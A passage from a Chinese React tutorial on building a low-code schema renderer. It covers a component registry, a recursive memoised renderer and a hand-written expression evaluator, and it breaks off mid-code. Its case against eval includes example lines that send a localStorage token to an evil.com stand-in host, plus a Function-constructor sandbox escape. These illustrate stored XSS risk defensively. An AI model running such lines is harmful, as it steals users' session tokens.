id 承担四件事：React 渲染的 key（1.3 的主题）；编辑器的选中/悬浮定位；撤销补丁的 path 终点（immer patch 的 path 是 `[...键路径]`，如 `['nodes', 'n_1', 'props', 'title']`）；跨模块关联（第 4 章 layout 与 panel 靠同一个 id 对上）。"稳定"意味着：生成后永不变化、永不复用——删除的 id 不能回收再用，否则撤销时新旧节点撞 id。生成方式推荐 `nanoid` 一类的随机 id，**绝不能用数组下标当 id**（下标随增删移动，等于 id 不稳定）。

#### 常见坑

- **症状**：schema 存进 localStorage 再读回来，`onClick` 变成 `undefined`，按钮失效。
  **根因**：协议里塞了函数（`onClick: () => openModal()`），`JSON.stringify` 静默丢弃函数键。
  **修法**：函数全部撤到注册表（动作注册表/组件注册表），schema 只存字符串键（`onClickAction: 'openModal'`）；再配一条 eslint 规则或运行时校验（遍历 schema，发现函数类型直接报错）拦住未来的同事。
- **症状**：删除一个节点再拖入新节点，页面部分组件状态错乱、React 报 key 重复警告。
  **根因**：id 用自增计数器且删除时"回退计数"复用了旧 id，新旧节点撞 key。
  **修法**：id 只生成不回收，用 `nanoid()`；如果必须有序（目录树展示），把序号和 id 分开存。
- **症状**：平台升级后，三个月前保存的旧页面全部白屏。
  **根因**：协议没带 `schemaVersion`，新渲染器读到旧形态的字段直接解构报错。
  **修法**：第一天就带版本号 + 入口 migrate（见原则 3）；渲染器对"读不到的字段"全部容错（`props.title ?? ''`）。
- **症状**：`props` 类型写着顺手用了 `Record<string, any>`，半年后没人知道 input 的 props 里有什么。
  **根因**：放弃了 discriminated union 的编译期保护。
  **修法**：每种 `type` 的 props 单独定义 interface，通过 1.2 的 `WidgetPropsMap` 与组件 props 打通，让"改协议不改组件"在编译期报错。

### 1.2 组件注册表模式

```tsx
const widgetRegistry: Record<WidgetType, ComponentType<WidgetProps>> = {
  input: InputWidget, select: SelectWidget, grid: GridWidget,
}
```
- 注册表带物料元信息：label / icon / 默认 props / setters 声明
- TS 进阶：`type WidgetMap = { [K in WidgetType]: ComponentType<WidgetProps<K>> }`

#### 是什么

注册表 = "type 字符串 → 组件"的映射 + 每个组件的物料元信息。渲染器拿到 `node.type` 后查表取组件，自己永远不写 `if (type === 'input')`。

#### 为什么需要

没有注册表的渲染器长这样：

```tsx
// 反例：渲染器里塞满了具体组件知识
if (node.type === 'input') return <InputWidget {...node.props} />
if (node.type === 'select') return <SelectWidget {...node.props} />
if (node.type === 'grid') return <GridWidget {...node.props} />
// 每加一种组件都要回来改渲染器……
```

问题有三：渲染器与具体组件强耦合，新增组件要改公共代码（违反开闭原则，多人协作时这是冲突热点）；这个文件会 import 所有组件，永远无法按需加载/裁剪；第 4 章"面板插件化"（新增面板类型零侵入）根本做不了。注册表把"有哪些组件"变成**数据**，渲染器退化成与具体组件无关的通用程序。

#### 怎么做（一）：完整注册表代码（含物料元信息）

```tsx
// materials/types.ts
import type { ComponentType, ReactNode } from 'react'

/** 每种物料的 props 形状——整个注册表类型安全的源头 */
export interface WidgetPropsMap {
  input: { fieldPath?: string; placeholder?: string; maxLength?: number }
  select: { options: { label: string; value: string }[]; mode?: 'single' | 'multiple' }
  grid: { columns: number; gap?: number }
  card: { title?: string }
  text: { content: string; level?: 1 | 2 | 3 }
}

export type WidgetType = keyof WidgetPropsMap

/** 所有 widget 组件的共同入参：nodeId 用于选中/事件上报 */
export interface WidgetCommonProps {
  nodeId: string
}

/** Setter 声明：属性面板里"一行配置"的描述（第 3 章消费） */
export interface SetterDeclaration {
  /** 对应 props 里的字段名 */
  name: string
  /** 用哪种 setter 控件渲染（setter 本身也是一层注册表） */
  setter: 'TextInputSetter' | 'NumberSetter' | 'SelectSetter' | 'ExpressionSetter'
  /** 显示名 */
  label: string
  /** setter 自身配置，如数字范围、下拉选项 */
  setterProps?: Record<string, unknown>
}

/** 物料元信息：注册一条 = 组件 + 一堆"关于组件的描述数据" */
export interface MaterialMeta<K extends WidgetType = WidgetType> {
  type: K
  /** 物料区显示名 */
  label: string
  /** 物料区图标（任意 ReactNode，比如 icon 库组件） */
  icon: ReactNode
  /** 物料区分组：基础 / 布局 / 业务…… */
  group: string
  /** 是否容器：决定能否往里拖子节点、大纲树能否展开 */
  isContainer: boolean
  /** 拖入画布时的初始 props：保证"新节点一落地就是合法的" */
  defaultProps: WidgetPropsMap[K]
  /** 属性面板的配置声明：属性面板据此自动生成表单 */
  setters: SetterDeclaration[]
  /** 组件本体 */
  component: ComponentType<WidgetPropsMap[K] & WidgetCommonProps>
}
```

```tsx
// materials/registry.ts
const registry = new Map<string, MaterialMeta>()

/** 注册一种物料（幂等：重复注册后者覆盖，方便开发期热替换） */
export function registerMaterial(meta: MaterialMeta): void {
  registry.set(meta.type, meta)
}

/** 渲染器用：type → 物料（找不到返回 undefined，渲染器负责兜底） */
export function getMaterial(type: string): MaterialMeta | undefined {
  return registry.get(type)
}

/** 物料区用：按分组列出全部物料 */
export function listMaterialsByGroup(): Record<string, MaterialMeta[]> {
  const groups: Record<string, MaterialMeta[]> = {}
  for (const meta of registry.values()) {
    ;(groups[meta.group] ??= []).push(meta)
  }
  return groups
}
```

```tsx
// materials/bootstrap.ts —— 集中注册，应用入口 import 一次
import { registerMaterial } from './registry'
import { InputWidget } from './widgets/InputWidget'
import { SelectWidget } from './widgets/SelectWidget'
import { GridWidget } from './widgets/GridWidget'
import { CardWidget } from './widgets/CardWidget'
import { TextWidget } from './widgets/TextWidget'

export function setupMaterials(): void {
  registerMaterial({
    type: 'input',
    label: '输入框',
    icon: <span>[T]</span>,
    group: '基础字段',
    isContainer: false,
    defaultProps: { fieldPath: '', placeholder: '请输入' },
    setters: [
      { name: 'fieldPath', setter: 'TextInputSetter', label: '字段路径' },
      { name: 'placeholder', setter: 'TextInputSetter', label: '占位提示' },
      { name: 'maxLength', setter: 'NumberSetter', label: '最大长度', setterProps: { min: 0, max: 200 } },
    ],
    component: InputWidget,
  })
  registerMaterial({
    type: 'grid',
    label: '栅格布局',
    icon: <span>[#]</span>,
    group: '布局容器',
    isContainer: true,
    defaultProps: { columns: 2, gap: 12 },
    setters: [
      { name: 'columns', setter: 'NumberSetter', label: '列数', setterProps: { min: 1, max: 12 } },
      { name: 'gap', setter: 'NumberSetter', label: '间距', setterProps: { min: 0, max: 48 } },
    ],
    component: GridWidget,
  })
  // select / card / text 同理……
}
```

**物料元信息逐字段：为什么需要**

- `label` / `icon` / `group`：物料区的渲染数据。没有它们，物料区就要 hardcode 一份组件清单——和注册表重复、必然漂移。
- `defaultProps`：拖入新节点时的初始 props。保证"节点一落画布就是合法的"（`grid` 必有 `columns`），渲染器不需要为缺字段兜底。
- `setters`：属性面板的声明数据。属性面板读取它、用 Setter 控件渲染一张配置表单——这是 §0 说的"自举"落地处，第 3 章展开。
- `isContainer`：拖拽引擎需要它判断"这个节点能不能作为拖放目标"、大纲树需要它决定能否展开。
- `component`：渲染器最终要的那个组件。

注意一个分层事实：`label/icon/setters` 只有**编辑器**用，`component/defaultProps` 渲染器也要用。把元信息和组件绑在一个 `MaterialMeta` 里注册一次，编辑器和渲染器共享同一份注册结果——不会出现"物料区显示的组件和画布渲染的组件不一致"。

#### 怎么做（二）：`WidgetMap` 映射类型进阶写法

开头大纲里的 `type WidgetMap = { [K in WidgetType]: ComponentType<WidgetProps<K>> }` 用"映射类型"表达"每种 type 对应**它自己 props 形状**的组件"。落地版：

```ts
// materials/types.ts（续）
/**
 * 映射类型：遍历 WidgetPropsMap 的每个键 K，
 * 要求注册的组件恰好接受 WidgetPropsMap[K]（该物料自己的 props）+ 公共 props。
 */
export type WidgetMap = {
  [K in WidgetType]: ComponentType<WidgetPropsMap[K] & WidgetCommonProps>
}

// 有了 WidgetMap，静态注册表可以获得"漏注册/错配"的编译期检查：
import { InputWidget } from './widgets/InputWidget'
import { SelectWidget } from './widgets/SelectWidget'
import { GridWidget } from './widgets/GridWidget'
import { CardWidget } from './widgets/CardWidget'
import { TextWidget } from './widgets/TextWidget'

// ✅ 完整且类型匹配的静态注册表
export const staticWidgets: WidgetMap = {
  input: InputWidget,
  select: SelectWidget,
  grid: GridWidget,
  card: CardWidget,
  text: TextWidget,
}

// 漏注册 text → 编译错误：
// Property 'text' is missing in type '{ input: ...; select: ... }'
// but required in type 'WidgetMap'

// 组件 props 形状不匹配 → 编译错误：
// Type 'ComponentType<{ columns: string }>' is not assignable to
// type 'ComponentType<{ columns: number; gap?: number } & WidgetCommonProps>'
```

两处编译期收益：**漏注册直接红线**（普通 `Record<string, ComponentType>` 做不到，string 索引没有穷尽性检查）；**props 形状错误直接红线**（把 `columns: string` 的组件注册给 `grid`，立即报错）。这把 1.1 协议与 1.2 注册表用类型焊死：改协议必改组件，漏改编译不过。

#### 静态映射 vs 运行时注册，怎么选

| | 静态对象（`WidgetMap`） | 运行时 `Map`（`registerMaterial`） |
|---|---|---|
| 类型安全 | 穷尽性检查、props 校验 | 注册期无法静态检查 |
| 动态物料（远程/插件） | 不支持 | 支持（第 6 章模块联邦加载物料靠它） |
| tree-shaking | 引用明确，利于静态分析 | 动态引用会连带打包所有注册物 |

实践：**两者结合**——核心物料走静态 `WidgetMap`（享受类型检查），再包一层运行时 `registerMaterial` 兼容动态物料；查询统一走 `getMaterial`（先查运行时 Map，再回落静态表）。

#### 常见坑

- **症状**：从物料区拖入组件，画布上一片空白，控制台无报错。
  **根因**：该 type 忘记注册（或注册文件没被 import，`bootstrap.ts` 根本没执行），`getMaterial` 返回 `undefined`，渲染器返回了 `null`。
  **修法**：渲染器对未注册类型渲染显式占位（`<div>未注册的组件类型：{type}</div>`，见 1.3）；注册集中在入口调用一次；开发期加断言——遍历协议所有 type，检查 `getMaterial` 均命中，启动即报错。
- **症状**：往注册表里存对象用 `obj[type] = meta`，某个 type 为 `__proto__` 时整个表行为异常。
  **根因**：普通对象做注册表有原型链污染面。
  **修法**：用 `Map`（`registry.set(type, meta)` 无原型链问题）；或用 `Object.create(null)`。
- **症状**：加了新物料，类型没报错，但属性面板不显示任何配置项。
  **根因**：`setters` 声明漏了（或字段名与 props 键不一致——`setters` 里写 `placeholder`，props 里叫 `tip`）。
  **修法**：写一个类型工具校验 `SetterDeclaration['name']` 必须是 `keyof WidgetPropsMap[K]`：`name: keyof WidgetPropsMap[K] & string`，让声明错键在编译期暴露。

### 1.3 递归渲染器

- `renderNode(node)`：布局容器递归 children，原子组件终止
- key 用 nodeId 绝不用数组 index（增删节点时状态错乱）
- Node 组件 memo：props 未变不重渲染（大树性能的第一道闸）

#### 是什么

递归渲染器是一个组件 `NodeView`：输入一个 schema 节点，输出该节点组件；若节点是容器，则对 `children` 逐个渲染 `NodeView` 自身。它是"解释器"本器——§0 那张图右边的框，核心代码只有几十行。

#### 为什么需要

因为 schema 是树、React 组件树也是树，树到树的最自然映射就是递归。同时它是复用面最大的模块：动态表单（第 2 章）、设计器画布（第 3 章）、仪表盘面板（第 4 章）、低代码页面（第 6 章）跑的都是它。

#### 怎么做：完整 renderNode 代码

```tsx
// renderer/NodeView.tsx
import { memo } from 'react'
import type { PageNode } from '../schema/page'
import { getMaterial } from '../materials/registry'

/** 容器判定：1.1 的类型守卫，'children' in node 同时完成 TS 收窄 */
function isContainerNode(node: PageNode): node is Extract<PageNode, { children: unknown }> {
  return 'children' in node
}

function NodeViewImpl({ node }: { node: PageNode }) {
  const material = getMaterial(node.type)

  // 兜底 1：未注册的类型渲染占位而不是抛错——单节点损坏不能白屏整棵树
  if (!material) {
    return <div style={{ color: 'red' }}>未注册的组件类型：{node.type}</div>
  }

  const Widget = material.component

  // 分支 A：容器 → 渲染自己 + 递归渲染 children
  if (isContainerNode(node)) {
    return (
      <Widget nodeId={node.id} {...node.props}>
        {node.children.map((child) => (
          <NodeView key={child.id} node={child} /> // key 用稳定 nodeId，见下文
        ))}
      </Widget>
    )
  }

  // 分支 B：原子组件 → 递归终止
  return <Widget nodeId={node.id} {...node.props} />
}

/** memo：props（即 node 引用）未变时跳过重渲染——大树性能的第一道闸 */
export const NodeView = memo(NodeViewImpl)
```

```tsx
// renderer/SchemaRenderer.tsx
import { NodeView } from './NodeView'
import type { PageSchema } from '../schema/page'

/** 渲染入口：整棵树从 root 开始 */
export function SchemaRenderer({ schema }: { schema: PageSchema }) {
  return <NodeView node={schema.root} />
}
```

**机制分步拆解**（对照 1.1 样例 2 的 JSON）：

```
NodeView(n_root)
└─ Widget(page)：渲染 <div style="padding:16px">，children 来自 React children
   ├─ NodeView(n_title)
   │  └─ Widget(text)：原子，递归终止
   └─ NodeView(n_grid)
      └─ Widget(grid)：渲染 grid 容器
         ├─ NodeView(n_name)
         │  └─ Widget(input)：终止
         └─ NodeView(n_phone)
            └─ Widget(input)：终止
```

1. 入口 `SchemaRenderer` 把 `root` 交给 `NodeView`；
2. `NodeView` 查注册表拿到 `page` 的组件；
3. `isContainerNode` 命中 → 走分支 A，组件渲染布局，`NodeView` 对每个 child 递归自己；
4. 递归在原子节点（分支 B）自然终止——终止条件不是计数器，而是"数据结构里没有 children 了"；
5. 递归深度 = 树深度。UI 树深度通常几十以内，调用栈毫无压力（若要做"无限深"的大纲类结构才需要改迭代）。

注意两个防御细节：`node.children` 用守卫保证存在才访问；未注册类型渲染占位（单点损坏不影响兄弟节点）。

#### key 为什么必须是 nodeId：index 作 key 的事故时序

先讲机制：React 的协调（reconciliation）在 diff 两棵子节点列表时，**用 key 匹配新旧节点，而不是用位置**。同 key = 同一个组件实例（state、DOM、焦点全部保留）；没 key 或 key 相同才退化到按位置。所以 key 的语义是"身份"，数组下标的问题在于**身份随增删漂移**。

用一张时序表复现事故。设画布列表 `[A, B, C]`，每个节点组件内部有 `useState`（比如 hover 态）且渲染一个非受控 `input`：

| 时刻 | 发生了什么 | nodes 数组 | React 眼中的 key→项 | 实例与 DOM 的命运 |
|---|---|---|---|---|
| t0 | 初次渲染 | [A, B, C] | 0→A, 1→B, 2→C | 实例 I0 渲染 A、I1 渲染 B、I2 渲染 C |
| t1 | 用户在第三行的输入框敲了 "hi"（DOM 值属于 I2） | [A, B, C] | 不变 | "hi" 存在 I2 持有的 DOM 节点上 |
| t2 | 删除 A | [B, C] | 0→B, 1→C | key 0 仍在 → **I0 复用**，改渲染 B 的 props；key 1 仍在 → I1 复用改渲染 C；key 2 消失 → **I2 卸载销毁** |

t2 的结果：React 认为发生了"两处更新 + 删除末尾一项"，而不是"删除第一项"。于是：

- I2（装着 "hi" 的那个实例）被销毁——用户视角：**我输入的文字跟着"最后一行"一起消失了**，尽管他删的是第一行；
- I1 原本属于 B 的实例现在渲染 C——组件内部 `useState` 的状态（展开态、hover 态、缓存）**全部串位**：B 的 hover 高亮留在了现在显示 C 的那行上；
- 若行上挂了进出场动画（CSSTransition / framer-motion），离场动画会在 C 上播放（因为"被删的"是 key 2 那项的视觉位置）；
- 与撤销系统（1.5）叠加更糟：撤销"删除 A"后数组恢复 [A,B,C]，下标 key 又把状态按位置重新配对一次。

**修法**：key 用稳定 nodeId（`key={child.id}`）。此时 t2 的 diff 是"key a 消失 → 卸载 A 的实例"，B、C 的实例与 DOM 纹丝不动，状态各归各位。这也是 1.1 原则 5"节点有稳定 id"在渲染层的兑现。想深挖 key 匹配算法（lastIndex、移动复用），可对照《react-源码复刻大纲.md》里协调器的实现。

#### Node 组件 memo：大树性能的第一道闸

**为什么需要**：编辑器里用户改的往往是**一个**节点的一个属性；如果父组件（画布）重渲染导致整棵 `NodeView` 树重跑 render + reconciliation，1000 个节点的树每次击键都是全树 diff。`memo` 让"props 没变"的子树直接跳过 render。

**为什么 memo 在这里能生效**：`memo` 做浅比较，比较的是 `props` 里每个引用。`NodeView` 的 props 只有一个 `node`——只要那个 node 对象引用不变，就跳过。而 1.7 会讲：用 immer 更新状态时，**结构共享**保证"没被修改的分支保持原引用"。两者相加：改 `n_grid` 的 `columns` → 只有 n_grid 到根路径上的对象换新引用 → 沿途 NodeView 重渲染，其余子树（比如 n_title）拿到的 `node` 引用没变 → memo 拦截 → 不 render。

**一个必须注意的写法细节**：不要把 `{...node.props}` 展开后再传给下一层可 memo 的组件：

```tsx
// 反例：{...node.props} 在每次父组件 render 都重新展开，props 里的对象/数组引用易被换新，
// 浅比较必败，memo 形同虚设（属性里再嵌数组时更是必败）
<Widget {...node.props} nodeId={node.id} />

// 正例（本节 NodeView 的做法）：让 Widget 直接接收 node，整体传递，引用稳定由 immer 的结构共享保证
<Widget node={node} />
// Widget 需要哪些字段在它内部解构，而不是在调用处展开
```

同理，给 NodeView 传回调时必须 `useCallback` 固定引用（如 `onSelect(nodeId)`），否则 memo 失效。

#### 常见坑

- **症状**：明明包了 `memo`，Profiler 里整树还是重渲染。
  **根因**：三选一——(a) 父层每次构造新 props 对象/新回调（未 `useCallback`）；(b) 状态没用 immer，每次 set 都 `JSON.parse(JSON.stringify(...))` 全树换引用；(c) 用了 Context 存 schema，Context value 变化无视 memo 直接穿透。
  **修法**：回调 `useCallback`；状态更新走 immer（1.7）；Context 只放"低频全局量"（选中态、编辑模式），不放 schema 本体（或拆 Context）。
- **症状**：控制台警告 "Encountered two children with the same key"。
  **根因**：nodeId 生成器复用了 id（见 1.1 坑 2），或两个容器复制粘贴没换 id。
  **修法**：复制节点时深拷贝并**重新生成整棵子树所有 id**（复制操作要递归换 id，子树内部相对引用才不乱）。
- **症状**：schema 里有脏数据（children 是 undefined 但 type 是容器），页面崩在 `.map` 上。
  **根因**：守卫依赖 `'children' in node`，而脏数据 `children: undefined` 时 `in` 为 true、`.map` 报错。
  **修法**：守卫改为 `Array.isArray((node as any).children)`；脏数据源头在导入 schema 时先过一遍校验（JSON Schema 校验器，第 5 章会用到同一套）。

---

### 1.4 表达式引擎

- 为什么禁用 `eval`/`new Function`：安全 + 作用域失控
- 选型：expr-eval（轻）、jexl、jsonata（强）
- 求值上下文注入：`{ $form, $user, $now }`，表达式里能读变量
- ✍️ 练习：**手写一个 100 行的 mini 求值器**（词法 → AST → 递归求值，支持四则/比较/逻辑/属性访问），做完你对 Babel/模板引擎的理解会上一个台阶

#### 是什么

表达式引擎是一个"受限语言解释器"：输入表达式字符串（`$form.age >= 18 && $user.vip`）和一个上下文对象（`{ $form, $user }`），输出求值结果（`true`）。语法通常覆盖：四则运算、比较、逻辑、属性访问、括号、字面量——恰好够表达"联动、条件、绑定"这类配置逻辑，且完全不含赋值、函数调用、循环等危险能力。

#### 为什么需要：协议里"逻辑是数据"的另一半

1.1 的设计原则 2 规定：schema 不含可执行代码，逻辑走表达式。那逻辑的**执行者**必须有人来当——这就是表达式引擎。它要同时满足四个条件：安全（不能执行任意代码）、可控（只能访问显式注入的变量）、可缓存（同一表达式避免重复解析）、可报错（配置期就能把语法错误标红）。

#### 为什么禁用 `eval` / `new Function`：逐条拆

假设直接 `eval(visibleWhen)` 来求值表达式，会发生什么：

1. **任意代码执行**。表达式来自 schema，schema 存在服务端、由运营或第三方接入方编写。`eval` 把它当代码跑，等于把存储型 XSS 引进门：

```ts
// 看起来是个"显示条件"，实际是一段偷数据的代码：
// "(function(){ fetch('//evil.com?c=' + localStorage.getItem('token')) })() || true"
const visible = eval(schema.visibleWhen)
```

   它能读 localStorage、发请求、改 DOM、植入键盘记录器——运行在**每个访问该页面的用户**浏览器里。

2. **作用域失控**。`eval` 在调用处的词法作用域内执行，能读写你闭包里的任何变量——你根本无法静态知道"这条表达式摸过了什么"。`new Function` 好一点（函数体在全局作用域执行），但它并没有解决安全问题：

```ts
// new Function 一样能拿全局对象、一样能发请求：
new Function('return fetch("//evil.com?c=" + localStorage.token)')()
// 经典的"沙箱逃逸"：从任意值摸到 Function 构造器，再拿 globalThis
new Function('return ({}).constructor.constructor("return globalThis")')()
```

   所谓"用 new Function 包一层就安全了"是错觉，它只是换了个执行位置。

3. **无法限制资源**。`eval('while(true){}')` 直接卡死主线程，你没有任何手段设超时（因为它就是同步代码）。

4. **CSP 冲突**。生产环境的 Content-Security-Policy 一旦禁用 `unsafe-eval`（安全团队的标准操作），eval 与 new Function 直接抛错——功能整体不可用。

而受限求值器从语法层就不存在这些能力面：语法里没有函数调用、没有赋值、没有属性写访问；变量只能从注入的上下文里取；语法错误在解析期就报出来（配置界面能画红线），而不是求值期炸页面。这四个问题一次性消失。

#### 选型：expr-eval / jexl / jsonata 怎么挑

| 库 | 定位 | 适合 |
|---|---|---|
| expr-eval | 轻量数学/逻辑表达式 | 只要四则、比较、逻辑、函数调用 |
| jexl | 为"配置里的表达式"设计（Transformers、上下文注入友好） | 联动/权限表达式，配置系统 |
| jsonata | JSON 查询+转换语言（很强也较重） | 需要在 schema 里做复杂数据变换/查询 |

经验：底座期先用自研 mini 求值器（本节练习）覆盖 90% 场景（显隐、禁用、绑定取值），遇到"要查数组、要聚合"再引 jsonata——表达式的**语法面越小越安全**，按需扩。

#### 求值上下文注入：`{ $form, $user, $now }`

上下文是表达式能看到的"全部世界"。约定用 `$` 前缀命名，避免与将来可能出现的普通字段名冲突：

```ts
const ctx = {
  $form: { city: 'bj', age: 20 },      // 当前表单数据
  $user: { vip: true, roles: ['admin'] },
  $now: Date.now(),                     // 注意：取值时固化，不在每次求值时变化
  $item: { ... },                       // 列表场景：当前行数据
}
evaluateExpression('$form.age >= 18 && $user.vip', ctx) // true
```

#### 怎么做：手写 mini 求值器（约 110 行，词法 → AST → 递归求值）

整体架构与 Babel/模板引擎同构，只是每层都小到能一眼看完：

```text
表达式字符串 ──词法分析 tokenize──► Token 流 ──语法分析 parse──► AST ──求值 evaluate──► 值
 "$form.age >= 18"            [ident $form][op .]…      Binary(>=)           true
```

**第 1 模块：词法分析（tokenize）——字符串切分成记号**

```ts
// expr/engine.ts
// ============ 1. 词法分析：字符流 → Token 流 ============
type Token =
  | { kind: 'num'; value: number }
  | { kind: 'str'; value: string }
  | { kind: 'ident'; value: string }
  | { kind: 'op'; value: string }
  | { kind: 'eof' }

function tokenize(src: string): Token[] {
  const tokens: Token[] = []
  let i = 0
  while (i < src.length) {
    const c = src[i]
    if (c === ' ') { i++; continue }                        // 跳过空白
    if (/[0-9]/.test(c)) {                                  // 数字（含小数）
      let j = i
      while (j < src.length && /[0-9.]/.test(src[j])) j++
      tokens.push({ kind: 'num', value: parseFloat(src.slice(i, j)) })
      i = j; continue
    }
    if (/[A-Za-z_$]/.test(c)) {                             // 标识符/变量（$form 里含 $）
      let j = i
      while (j < src.length && /[A-Za-z0-9_$]/.test(src[j])) j++
      tokens.push({ kind: 'ident', value: src.slice(i, j) })
      i = j; continue
    }
    if (c === '"' || c === "'") {                           // 字符串字面量
      let j = i + 1
      while (j < src.length && src[j] !== c) j++
      if (j >= src.length) throw new SyntaxError('字符串缺少结束引号')
      tokens.push({ kind: 'str', value: src.slice(i + 1, j) })
      i = j + 1; continue
    }
    const three = src.slice(i, i + 3)                       // 先匹配三字符：=== !==
    if (three === '===' || three === '!==') {
      tokens.push({ kind: 'op', value: three }); i += 3; continue
    }
    const two = src.slice(i, i + 2)                         // 再匹配两字符：<= >= == != && ||
    if (['<=', '>=', '==', '!=', '&&', '||'].includes(two)) {
      tokens.push({ kind: 'op', value: two }); i += 2; continue
    }
    if ('+-*/().<>!'.includes(c)) {                         // 最后单字符运算符
      tokens.push({ kind: 'op', value: c }); i++; continue
    }
    throw new SyntaxError(`非法字符：${c}`)                  // 白名单之外直接拒绝
  }
  tokens.push({ kind: 'eof' })
  return tokens
}
```

机制说明：单指针 `i` 从左到右扫，每轮识别一个 token；运算符按"三字符 → 两字符 → 单字符"的顺序贪心匹配，保证 `>=` 不会被拆成 `>` 和 `=`；词法层就是白名单——出现列表之外的字符立刻抛错，攻击面在这里第一次收窄。

以 `'$form.age >= 18 && $user.vip'` 为例，产出：

```text
ident($form) op(.) ident(age) op(>=) num(18) op(&&) ident($user) op(.) ident(vip) eof
```

**第 2 模块：语法分析（parse）——Token 流 → AST（优先级爬升法）**

```ts
// ============ 2. 语法分析：Token 流 → AST ============
type Ast =
  | { type: 'Lit'; value: number | string | boolean | null }
  | { type: 'Ident'; name: string }
  | { type: 'Member'; obj: Ast; prop: string }              // 属性访问 a.b
  | { type: 'Unary'; op: '-' | '!'; arg: Ast }
  | { type: 'Binary'; op: string; left: Ast; right: Ast }   // 四则/比较
  | { type: 'Logical'; op: '&&' | '||'; left: Ast; right: Ast } // 逻辑（短路）

/** 运算符优先级：数字越大绑得越紧（先算） */
const BINARY_PREC: Record<string, number> = {
  '||': 1,
  '&&': 2,
  '==': 3, '!=': 3, '===': 3, '!==': 3,
  '<': 4, '>': 4, '<=': 4, '>=': 4,
  '+': 5, '-': 5,
  '*': 6, '/': 6,
}

function parse(src: string): Ast {
  const tokens = tokenize(src)
  let pos = 0
  const peek = (): Token => tokens[pos]
  const eatOp = (op: string): void => {
    const t = peek()
    if (t.kind === 'op' && t.value === op) { pos++; return }
    throw new SyntaxError(`期望 "${op}"，实际是 ${JSON.stringify(t)}`)
  }

  // 一元运算：-x、!x（递归支持 !!x、--x 的连续前缀）
  function parseUnary(): Ast {
    const t = peek()
    if (t.kind === 'op' && (t.value === '-' || t.value === '!')) {
      pos++
      return { type: 'Unary', op: t.value as '-' | '!', arg: parseUnary() }
    }
    return parsePostfix()
  }

  // 后缀：属性访问 a.b.c，左结合，优先级最高（!a.b 才能正确解析成 !(a.b)）
  function parsePostfix(): Ast {
    let node = parsePrimary()
    while (peek().kind === 'op' && (peek() as { value: string }).value === '.') {
      pos++
      const prop = peek()
      if (prop.kind !== 'ident') throw new SyntaxError(`"." 后应为属性名，实际是 ${JSON.stringify(prop)}`)
      pos++
      node = { type: 'Member', obj: node, prop: prop.value }
    }
    return node
  }

  // 最小单元：字面量 / 变量 / 括号
  function parsePrimary(): Ast {
    const t = peek()
    if (t.kind === 'num' || t.kind === 'str') { pos++; return { type: 'Lit', value: t.value } }
    if (t.kind === 'ident') {
      pos++
      if (t.value === 'true') return { type: 'Lit', value: true }
      if (t.value === 'false') return { type: 'Lit', value: false }
      if (t.value === 'null') return { type: 'Lit', value: null }
      return { type: 'Ident', name: t.value }
    }
    if (t.kind === 'op' && t.value === '(') {
      pos++
      const inner = parseExpr(0)
      eatOp(')')            // 括号只改变优先级，不出现在 AST 里
      return inner
    }
    throw new SyntaxError(`意外的记号 ${JSON.stringify(t)}`)
  }

  // 二元/逻辑：优先级爬升（precedence climbing）
  function parseExpr(minPrec: number): Ast {
    let left = parseUnary()
    for (;;) {
      const t = peek()
      if (t.kind !== 'op') break
      const prec = BINARY_PREC[t.value]
      if (prec === undefined || prec < minPrec) break   // 优先级不够就交还上层
      pos++
      const right = parseExpr(prec + 1)                 // +1：同级运算符左结合
      if (t.value === '&&' || t.value === '||') {
        left = { type: 'Logical', op: t.value as '&&' | '||', left, right }
      } else {
        left = { type: 'Binary', op: t.value, left, right }
      }
    }
    return left
  }

  const ast = parseExpr(0)
  if (peek().kind !== 'eof') throw new SyntaxError(`表达式末尾有多余内容：${JSON.stringify(peek())}`)
  return ast
}
```

机制说明——优先级爬升是本模块的灵魂，用 `1 + 2 * 3` 走一遍：

1. `parseExpr(0)` 先取左侧 `1`；
2. 看到 `+`（优先级 5 ≥ 0），右侧调 `parseExpr(5 + 1)`——右侧解析**只接受优先级 ≥ 6 的运算符**；
3. 右侧取 `2`，看到 `*`（优先级 6 ≥ 6 成立）继续，取 `3`，得 `2 * 3`；看到 eof 退出；
4. 回到外层拼成 `1 + (2*3)`——乘法自然比加法"绑得紧"，不需要为每级优先级写一个函数；
5. "同级左结合"由 `prec + 1` 保证：`1 - 2 - 3` 中第二个 `-`（优先级 5 < 5+1）不进右侧递归，回到外层拼成 `(1-2)-3`，结果 -4 而不是 2。

`$form.age >= 18 && $user.vip` 解析出的 AST：

```text
Logical(&&)
├── Binary(>=)
│   ├── Member
│   │   ├── Member
│   │   │   ├── Ident($form)
│   │   │   └── prop: age
│   │   └── (end)
│   └── Lit(18)
└── Member
    ├── Ident($user)
    └── prop: vip
```

**第 3 模块：递归求值（evaluate）——AST + 上下文 → 值**

```ts
// ============ 3. 递归求值：AST + 上下文 → 值 ============
function toBool(v: unknown): boolean {
  return Array.isArray(v) ? v.length > 0 : Boolean(v) // 数组按"非空"取真值（注意：与 JS 不同，JS 里 [] 也是 truthy；表达式引擎按"有没有值"判定更符合表单直觉）
}

export function evaluate(ast: Ast, ctx: Record<string, unknown>): unknown {
  switch (ast.type) {
    case 'Lit':
      return ast.value
    case 'Ident': {
      // 只能读显式注入的变量——作用域在这里被钉死
      if (!Object.prototype.hasOwnProperty.call(ctx, ast.name)) {
        throw new ReferenceError(`未定义的变量：${ast.name}`)
      }
      return ctx[ast.name]
    }
    case 'Member': {
      const obj = evaluate(ast.obj, ctx)
      if (obj == null) return undefined            // 中途 null/undefined 安全短路
      if (ast.prop === '__proto__' || ast.prop === 'constructor') {
        throw new Error(`禁止访问属性：${ast.prop}`) // 封死原型链攻击面
      }
      return (obj as Record<string, unknown>)[ast.prop]
    }
    case 'Unary': {
      const v = evaluate(ast.arg, ctx)
      return ast.op === '-' ? -Number(v) : !toBool(v)
    }
    case 'Logical': {
      // 短路求值：&& 左假返左值；|| 左真返左值（语义与 JS 完全对齐）
      const l = evaluate(ast.left, ctx)
      if (ast.op === '&&') return toBool(l) ? evaluate(ast.right, ctx) : l
      return toBool(l) ? l : evaluate(ast.right, ctx)
    }
    case 'Binary': {
      const l = evaluate(ast.left, ctx)
      const r = evaluate(ast.right, ctx)
      switch (ast.op) {
        case '+':
          // 任一侧是字符串则拼接；否则数值相加（与 JS 的 + 语义对齐）
          if (typeof l === 'string' || typeof r === 'string') return String(l) + String(r)
          return Number(l) + Number(r)
        case '-': return Number(l) - Number(r)
        case '*': return Number(l) * Number(r)
        case '/': return Number(l) / Number(r)
        case '<': case '>': case '<=': case '>=': {
